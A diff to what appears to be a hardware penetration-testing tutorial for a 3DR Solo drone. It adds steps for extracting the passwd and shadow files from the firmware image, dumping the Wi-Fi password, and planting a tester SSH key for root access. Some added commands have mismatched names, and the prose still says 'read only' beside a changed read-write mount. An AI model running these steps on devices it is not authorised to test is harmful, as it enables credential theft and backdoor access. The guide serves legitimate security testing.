@@ -111,7 +111,7 @@ Creates a mount point to attach the /dev/sdb partition
 - Mount the sdb3 partition as a “Read Only” file system
 
 ```bash
-sudo mount -o ro /dev/sdb3 /mnt/solo/p3
+sudo mount -o rw /dev/sdb3 /mnt/solo/p3
 ```
 Mounts the microSD partition 3 as ‘read only’ to /mnt/solo/p3
 
@@ -120,6 +120,15 @@ Mounts the microSD partition 3 as ‘read only’ to /mnt/solo/p3
 - Find out what files and directories are in this partition
 ```bash
 ls /mnt/solo/p3
+cp /mnt/solo/p2/3dr.....squashfs .
+sudo unsquashfs 3dr...squashfs
+ls # squashfs-root
+cd unsquash-root/etc
+mkdir /home/kali/unshadow
+cp passwd /home/kali/unshadow
+cp shadow /home/kali/unshadow
+ls /home/kali/unshadow
+
 ```
 <img src="../img/listfiles.png" style="width: 80%; height: auto;" align="center">
 
@@ -153,7 +162,7 @@ ls /mnt/solo/p3/etc
 
 -Dump the contents of the `wpa_supplicant.conf` file
 ```bash
-cat /etc/solo/p3/wpasupplicant.conf
+cat /etc/solo/p3/wpa_supplicant.conf
 ```
 Lists the SSID and PSK (password) of the wifi connection
 
@@ -291,7 +300,7 @@ The following instructions will add tester controlled ssh keys to the 3DR to all
 
 ```bash
 # generate a SSH keypair
-ssh-keygen -f tester
+ssh-keygen -t rsa -f tester
 ```
 Insert tester SSH key into 3DR root filesystem
 
